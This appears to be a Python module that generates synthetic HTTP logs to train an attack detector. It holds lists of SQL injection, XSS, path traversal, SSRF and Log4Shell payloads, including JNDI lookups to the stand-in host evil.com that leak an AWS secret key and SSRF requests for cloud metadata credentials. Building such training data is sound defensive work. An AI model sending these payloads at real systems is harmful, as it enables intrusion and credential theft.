"""
©AngelaMos | 2026
synthetic.py

Synthetic HTTP traffic generator for ML training and
testing with realistic attack payloads

Provides per-category generators for 6 attack types:
generate_sqli_requests (22 SQL injection payloads),
generate_xss_requests (21 XSS vectors), generate_
traversal_requests (15 path traversal payloads),
generate_log4shell_requests (10 JNDI lookup variants),
generate_ssrf_requests (11 cloud metadata and internal
service targets), and generate_scanner_requests (11
vulnerability scanner user-agents). generate_normal_
requests produces benign traffic across 31 realistic
paths. generate_mixed_dataset orchestrates all generators,
converts ParsedLogEntry objects to 35-dim feature vectors
via extract_request_features and encode_for_inference with
zeroed windowed features, and returns (X, y) numpy arrays

Connects to:
  core/features/extractor - extract_request_features
  core/features/encoder   - encode_for_inference
  core/features/mappings  - WINDOWED_FEATURE_NAMES
  core/ingestion/parsers  - ParsedLogEntry
  cli/main                - used when no CSIC dataset is
                            available
"""

import logging
import random
from datetime import UTC, datetime, timedelta

import numpy as np

from app.core.features.encoder import encode_for_inference
from app.core.features.extractor import extract_request_features
from app.core.features.mappings import WINDOWED_FEATURE_NAMES
from app.core.ingestion.parsers import ParsedLogEntry

logger = logging.getLogger(__name__)

SQLI_PAYLOADS: list[str] = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "1; DROP TABLE users--",
    "admin'--",
    "' AND 1=1--",
    "' AND SLEEP(5)--",
    "' OR BENCHMARK(1000000,SHA1('test'))--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "' UNION ALL SELECT @@version--",
    "-1' UNION SELECT 1,CONCAT(user(),database())--",
    "' OR 'x'='x",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
    "admin' AND '1'='1",
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "' INTO OUTFILE '/tmp/shell.php'--",
    "1' AND 1=1 UNION SELECT 1,2,3--",
    "' OR EXISTS(SELECT * FROM users)--",
]

XSS_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    "<script>document.cookie</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "'-alert(1)-'",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=prompt(1)>",
    "<svg/onload=confirm(1)>",
    "\" onfocus=alert(1) autofocus=\"",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<link rel=import href=data:text/html,<script>alert(1)</script>>",
    "{{constructor.constructor('alert(1)')()}}",
    "<style>@import'javascript:alert(1)'</style>",
    "expression(alert(1))",
]

TRAVERSAL_PAYLOADS: list[str] = [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\config\\sam",
    "../../../etc/shadow",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%c0%afetc%c0%afpasswd",
    "../../proc/self/environ",
    "../../var/log/auth.log",
    "../../.env",
    "../../.git/config",
    "../../../boot.ini",
    "../../web.config",
    "../../wp-config.php",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
]

LOG4SHELL_PAYLOADS: list[str] = [
    "${jndi:ldap://evil.com/a}",
    "${jndi:rmi://evil.com/a}",
    "${jndi:dns://evil.com/a}",
    "${jndi:ldap://127.0.0.1/a}",
    "${${lower:j}ndi:ldap://evil.com/a}",
    "${${upper:j}ndi:ldap://evil.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
    "${jndi:ldap://evil.com/${env:AWS_SECRET_KEY}}",
    "${jndi:${lower:l}${lower:d}ap://evil.com/a}",
    "${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://evil.com/a}",
]

SSRF_TARGETS: list[str] = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.170.2/v2/credentials",
    "http://100.100.100.200/latest/meta-data/",
    "http://127.0.0.1:8080/admin",
    "http://localhost:9200/_cat/indices",
    "http://10.0.0.1:6379/",
    "http://192.168.1.1/admin",
    "file:///etc/passwd",
    "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:11211/stats",
]

SCANNER_UAS: list[str] = [
    "Nikto/2.1.6",
    "sqlmap/1.7",
    "Nessus/10.0",
    "DirBuster-1.0-RC1",
    "Acunetix-Product",
    "w3af/1.0",
    "Nmap Scripting Engine",
    "Wfuzz/3.1.0",
    "gobuster/3.6",
    "masscan/1.3.2",
    "ZAP/2.14.0",
]

NORMAL_PATHS: list[str] = [
    "/",
    "/index.html",
    "/api/v1/users",
    "/api/v1/users/123",
    "/api/v1/products",
    "/api/v1/products/456",
    "/api/v1/orders",
    "/api/v1/search",
    "/api/v2/health",
    "/api/v2/metrics",
    "/dashboard",
    "/dashboard/settings",
    "/login",
    "/logout",
    "/register",
    "/profile",
    "/profile/edit",
    "/about",
    "/contact",
    "/faq",
    "/static/css/main.css",
    "/static/js/app.js",
    "/static/images/logo.png",
    "/favicon.ico",
    "/robots.txt",
    "/sitemap.xml",
    "/blog",
    "/blog/2026/01/post-title",
    "/docs",
    "/docs/api-reference",
    "/status",
    "/feed.xml",
]

NORMAL_UAS: list[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

ATTACK_PATHS: list[str] = [
    "/login",
    "/admin",
    "/admin/config",
    "/api/v1/users",
    "/api/v1/auth",
    "/api/v1/search",
    "/wp-admin",
    "/wp-login.php",
    "/phpmyadmin",
    "/manager/html",
    "/actuator/env",
    "/api/v1/upload",
    "/api/v1/export",
    "/console",
    "/debug",
]


def _random_ip() -> str:
    """
    Generate a random public-looking IP address
    """
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def _random_timestamp() -> datetime:
    """
    Generate a random timestamp within the last 24 hours
    """
    offset = random.randint(0, 86400)
    return datetime.now(UTC) - timedelta(seconds=offset)


def _make_entry(
    method: str,
    path: str,
    query_string: str,
    status_code: int,
    response_size: int,
    user_agent: str,
    ip: str | None = None,
) -> ParsedLogEntry:
    """
    Build a ParsedLogEntry with randomized metadata
    """
    return ParsedLogEntry(
        ip=ip or _random_ip(),
        timestamp=_random_timestamp(),
        method=method,
        path=path,
        query_string=query_string,
        status_code=status_code,
        response_size=response_size,
        referer="",
        user_agent=user_agent,
        raw_line="",
    )


def generate_sqli_requests(n: int, ) -> list[ParsedLogEntry]:
    """
    Generate n requests with SQL injection payloads
    """
    entries: list[ParsedLogEntry] = []
    for _ in range(n):
        payload = random.choice(SQLI_PAYLOADS)
        path = random.choice(ATTACK_PATHS)
        if random.random() < 0.5:
            entries.append(
                _make_entry(
                    method="GET",
                    path=path,
                    query_string=f"id={payload}",
                    status_code=random.choice([200, 500]),
                    response_size=random.randint(0, 5000),
                    user_agent=random.choice(NORMAL_UAS),
                ))
        else:
            entries.append(
                _make_entry(
                    method="POST",
                    path=path,
                    query_string=f"username={payload}&password=x",
                    status_code=random.choice([200, 403]),
                    response_size=random.randint(0, 2000),
                    user_agent=random.choice(NORMAL_UAS),
                ))
    return entries


def generate_xss_requests(n: int, ) -> list[ParsedLogEntry]:
    """
    Generate n requests with XSS payloads
    """
    entries: list[ParsedLogEntry] = []
    for _ in range(n):
        payload = random.choice(XSS_PAYLOADS)
        path = random.choice(ATTACK_PATHS)
        entries.append(
            _make_entry(
                method="GET",
                path=path,
                query_string=f"q={payload}",
                status_code=200,
                response_size=random.randint(500, 5000),
                user_agent=random.choice(NORMAL_UAS),
            ))
    return entries


def generate_traversal_requests(n: int, ) -> list[ParsedLogEntry]:
    """
    Generate n requests with path traversal payloads
    """
    entries: list[ParsedLogEntry] = []
    for _ in range(n):
        payload = random.choice(TRAVERSAL_PAYLOADS)
        entries.append(
            _make_entry(
                method="GET",
                path=f"/{payload}",
                query_string="",
                status_code=random.choice([200, 403, 404]),
                response_size=random.randint(0, 1000),
                user_agent=random.choice(NORMAL_UAS),
            ))
    return entries


def generate_log4shell_requests(n: int, ) -> list[ParsedLogEntry]:
    """
    Generate n requests with Log4Shell JNDI payloads
    """
    entries: list[ParsedLogEntry] = []
    for _ in range(n):
        payload = random.choice(LOG4SHELL_PAYLOADS)
        path = random.choice(ATTACK_PATHS)
        entries.append(
            _make_entry(
                method="GET",
                path=path,
                query_string=f"cmd={payload}",
                status_code=200,
                response_size=random.randint(0, 2000),
                user_agent=payload,
            ))
    return entries


def generate_ssrf_requests(n: int, ) -> list[ParsedLogEntry]:
    """
    Generate n requests with SSRF target URLs
    """
    entries: list[ParsedLogEntry] = []
    for _ in range(n):
        target = random.choice(SSRF_TARGETS)
        path = random.choice(ATTACK_PATHS)
        entries.append(
            _make_entry(
                method="GET",
                path=path,
                query_string=f"url={target}",
                status_code=random.choice([200, 302]),
                response_size=random.randint(0, 3000),
                user_agent=random.choice(NORMAL_UAS),
            ))
    return entries


def generate_scanner_requests(n: int, ) -> list[ParsedLogEntry]:
    """
    Generate n requests mimicking vulnerability scanners
    """
    entries: list[ParsedLogEntry] = []
    for _ in range(n):
        path = random.choice(ATTACK_PATHS)
        entries.append(
            _make_entry(
                method=random.choice(["GET", "HEAD", "OPTIONS"]),
                path=path,
                query_string="",
                status_code=random.choice([200, 301, 403, 404]),
                response_size=random.randint(0, 500),
                user_agent=random.choice(SCANNER_UAS),
            ))
    return entries


def generate_normal_requests(n: int, ) -> list[ParsedLogEntry]:
    """
    Generate n realistic benign HTTP requests
    """
    entries: list[ParsedLogEntry] = []
    for _ in range(n):
        path = random.choice(NORMAL_PATHS)
        has_query = random.random() < 0.3
        query = (f"page={random.randint(1, 20)}" if has_query else "")
        entries.append(
            _make_entry(
                method=random.choice(["GET", "GET", "GET", "POST"]),
                path=path,
                query_string=query,
                status_code=random.choice([200, 200, 200, 301, 304]),
                response_size=random.randint(200, 50000),
                user_agent=random.choice(NORMAL_UAS),
            ))
    return entries


def _entries_to_vectors(entries: list[ParsedLogEntry], ) -> list[list[float]]:
    """
    Convert ParsedLogEntry list to 35-dim feature vectors
    """
    vectors: list[list[float]] = []
    for entry in entries:
        features = extract_request_features(entry)
        for name in WINDOWED_FEATURE_NAMES:
            features[name] = 0.0
        vectors.append(encode_for_inference(features))
    return vectors


def generate_mixed_dataset(
    n_normal: int = 1000,
    n_attack: int = 500,
) -> tuple[np.ndarray, np.ndarray]:
    """
    Generate a mixed normal and attack dataset with feature vectors
    """
    normal = generate_normal_requests(n_normal)
    normal_vectors = _entries_to_vectors(normal)

    per_type = n_attack // 6
    remainder = n_attack - (per_type * 6)

    attacks: list[ParsedLogEntry] = []
    attacks.extend(generate_sqli_requests(per_type + remainder))
    attacks.extend(generate_xss_requests(per_type))
    attacks.extend(generate_traversal_requests(per_type))
    attacks.extend(generate_log4shell_requests(per_type))
    attacks.extend(generate_ssrf_requests(per_type))
    attacks.extend(generate_scanner_requests(per_type))
    attack_vectors = _entries_to_vectors(attacks)

    X = np.array(
        normal_vectors + attack_vectors,
        dtype=np.float32,
    )
    y = np.array(
        [0] * len(normal_vectors) + [1] * len(attack_vectors),
        dtype=np.int32,
    )

    logger.info(
        "Generated dataset: X=%s (normal=%d, attack=%d)",
        X.shape,
        n_normal,
        len(attacks),
    )

    return X, y
